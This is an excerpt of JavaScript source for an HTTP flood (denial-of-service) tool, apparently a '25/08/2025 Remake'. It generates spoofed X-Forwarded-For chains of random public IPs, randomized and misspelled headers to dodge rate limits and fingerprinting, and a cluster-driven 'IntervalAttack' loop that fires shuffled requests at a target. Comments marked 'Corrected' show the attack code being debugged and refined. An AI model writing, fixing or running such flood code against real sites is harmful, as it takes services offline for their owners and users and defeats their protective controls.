...
// Helper function to check if an IP address is private or reserved
const isPrivateOrReservedIp = (ip) => {
    const parts = ip.split('.').map(Number);
    if (parts.length !== 4 || parts.some(isNaN)) return true; // Invalid format
    ...
    // Loopback, APIPA, Multicast, Reserved for future use
    if (parts[0] === 0) return true; // 0.0.0.0/8 (current network)
    if (parts[0] === 127) return true; // 127.0.0.0/8 (loopback)
    if (parts[0] === 169 && parts[1] === 254) return true; // 169.254.0.0/16 (APIPA)
    if (parts[0] >= 224 && parts[0] <= 239) return true; // 224.0.0.0/4 (multicast)
    if (parts[0] >= 240 && parts[0] <= 255) return true; // 240.0.0.0/4 (reserved for future use/experimental)

    return false;
};

// Generates a single random IPv4 address, attempting to avoid private/reserved ranges
const generateLegitSingleIp = () => {
    let ip;
    let attempts = 0;
    const maxAttempts = 100; // Limit attempts to prevent infinite loops

    do {
        const getRandomOctet = () => Math.floor(Math.random() * 256); // 0-255
        const o1 = getRandomOctet();
        const o2 = getRandomOctet();
        const o3 = getRandomOctet();
        const o4 = getRandomOctet();
        ip = `${o1}.${o2}.${o3}.${o4}`;
        attempts++;
        if (attempts > maxAttempts) {
            // Fallback: if after many attempts, we can't find a "legit" IP,
            // return a well-known public IP with a random last octet as a safe default.
            return `8.8.8.${Math.floor(Math.random() * 254) + 1}`;
        }
    } while (isPrivateOrReservedIp(ip)); // Loop until a non-private/non-reserved IP is generated

    return ip;
};

// Generates a legitimate-looking X-Forwarded-For header value (a chain of 1-3 IPs)
const generateXForwardedForHeaderValue = () => {
    const numIpsInChain = randomIntn(1, 4); // Generate 1, 2, or 3 IPs in the chain
    const ipChain = [];
    for (let i = 0; i < numIpsInChain; i++) {
        ipChain.push(generateLegitSingleIp());
    }
    return ipChain.join(', '); // Join IPs with comma and space
};

// Renamed to reflect they generate random numbers, not IP-related values.
...
// Update the 'spoofed' variable to hold the X-Forwarded-For string
const spoofed = generateXForwardedForHeaderValue();
const spoofed2 = getRandomNumber1();
const spoofed3 = getRandomNumber2();
const spoofed4 = getRandomNumber3();
...
// Corrected: multi and multi2 should be objects if spread in headers
var multi_header_value = FA1 + "-" + FAB1 + ": " + mad1 + "-" + generateRandomString(4,25);
var multi2_header_value = FAB1 + "-" + FA1 + ": " + mad1 + "-" + generateRandomString(4,16);
...
const rateHeaders2 = [
    ...
    // Removed "X-Forwarded-For": spoofed3 as it was incorrect
    { "Width": "1920" },
];
const rateHeaders3 = [
    { "devxice-memory": "0.3" },
    { "eaccept-languagep": lang }, // Typo, leaving as is based on original
    { "X-drequested-withp": "XMLHttpRequest" }, // Typo, leaving as is based on original
    { "Viecwport-widthp": "1080" }, // Typo, leaving as is based on original
];
const rateHeaders4 = [
    { "Maxw-Forwardsp": "5" }, // Typo, leaving as is based on original
    { "prawgmap": "no-cache" }, // Typo, leaving as is based on original
    { "Sewc-ch-uwa-Archp": "Private" }, // Typo, leaving as is based on original
    { "Seac-Gpxcp": "1" }, // Typo, leaving as is based on original
];
...
if (cluster.isMaster) {
    console.clear()
    console.log(`25/08/2025 Remake`.rainbow)
    console.log(`--------------------------------------------`.gray)
        ...
        client.on("connect", async () => {
            const IntervalAttack = setInterval(() => {
                ...
                const shuffledHeaders = shuffleObject({
                    ...
                    "x-https": "on",
                    // Corrected: Use spoofed for X-Forwarded-For
                    "x-forwarded-for": spoofed,
                    // Corrected: multi and multi2 were strings, now they are custom headers
                    "X-Custom-Multi-1": multi_header_value,
                    "X-Custom-Multi-2": multi2_header_value,
